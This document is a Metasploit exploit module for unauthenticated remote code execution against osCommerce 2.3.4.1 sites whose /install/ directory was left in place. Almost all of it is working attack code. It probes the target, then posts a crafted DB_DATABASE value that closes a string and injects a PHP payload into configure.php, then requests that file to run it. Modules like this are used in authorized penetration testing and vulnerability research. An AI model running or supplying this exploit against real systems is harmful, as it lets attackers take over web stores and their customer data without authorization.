# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(update_info(info,
      &#039;Name&#039;           => &#039;osCommerce Installer Unauthenticated Code Execution&#039;,
      &#039;Description&#039;    => %q{
        If the /install/ directory was not removed, it is possible for an unauthenticated
        attacker to run the "install_4.php" script, which will create the configuration
        file for the installation. This allows the attacker to inject PHP code into the
        configuration file and execute it.
      },
      &#039;Author&#039;         => [
        &#039;Simon Scannell&#039;,      # Original exploit author
        &#039;Daniel Teixeira&#039;      # MSF module author
        ],
      &#039;License&#039;        => MSF_LICENSE,
      &#039;References&#039;     =>
        [
          [&#039;EDB&#039;, &#039;44374&#039;],
        ],
        &#039;Payload&#039;      =>
        {
          &#039;BadChars&#039; => "\x00",
        },
       &#039;Privileged&#039; => false,
       &#039;Platform&#039;   => [&#039;php&#039;],
       &#039;Arch&#039;       => ARCH_PHP,
       &#039;Targets&#039; =>
          [
            [ &#039;osCommerce 2.3.4.1&#039;, { } ],
          ],
      &#039;DisclosureDate&#039; => &#039;Apr 30 2018&#039;,
      &#039;DefaultTarget&#039; => 0))
     register_options(
      [
        OptString.new(&#039;URI&#039;, [true, &#039;The path to the install directory&#039;, &#039;/catalog/install/&#039;])
      ])
  end

  def check
    res = send_request_cgi({
      &#039;uri&#039;    => normalize_uri(datastore[&#039;URI&#039;], &#039;install.php&#039;),
      &#039;method&#039; => &#039;GET&#039;
    })

    unless res
      vprint_error &#039;Connection failed&#039;
      return CheckCode::Unknown
    end

    unless res.code == 200 && res.body.include?(&#039;osCommerce Website&#039;)
      return CheckCode::Safe
    end

    res = send_request_cgi({
      &#039;uri&#039;    => normalize_uri(datastore[&#039;URI&#039;], &#039;index.php&#039;),
      &#039;method&#039; => &#039;GET&#039;
    })

    if res.body.include?(&#039;configure.php&#039;) && res.body.include?(&#039;The following files need to have their file permissions set to world-writeable (chmod 777):&#039;)
      vprint_error &#039;configure.php is not writable&#039;
      return CheckCode::Safe
    end

    CheckCode::Appears
  end

  def trigger
    send_request_cgi({
      &#039;uri&#039;     => normalize_uri(datastore[&#039;URI&#039;], &#039;includes/configure.php&#039;),
      &#039;method&#039;  => &#039;GET&#039;
    })
  end

  def exploit
    unless check == CheckCode::Appears
      fail_with Failure::NotVulnerable, &#039;Target is not vulnerable&#039;
    end

    data = {
      &#039;DIR_FS_DOCUMENT_ROOT&#039; => &#039;./&#039;,
      &#039;DB_DATABASE&#039; => "&#039;);#{payload.encoded}/*"
    }

    res = send_request_cgi({
      &#039;uri&#039;       => normalize_uri(datastore[&#039;URI&#039;], &#039;install.php?step=4&#039;),
      &#039;method&#039;    => &#039;POST&#039;,
      &#039;vars_post&#039; => data
    })
    trigger
  end
end

